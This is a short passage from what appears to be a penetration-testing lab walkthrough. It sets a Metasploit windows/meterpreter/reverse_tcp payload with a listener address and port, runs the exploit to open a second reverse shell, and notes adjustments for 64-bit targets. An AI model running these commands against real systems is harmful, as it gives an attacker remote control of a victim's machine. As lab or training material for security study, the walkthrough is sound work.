    set payload windows/meterpreter/reverse_tcp

    set LHOST 192.168.1.39

    set LPORT 4545 (Important: use a different port from one used in original

    shell)

    exploit

    ```


    > Note:

    If you are using 64 bit you will need to "show targets" and Set the tar-\get to
    x64. You will also need to use the 64 bit version of the payload.'
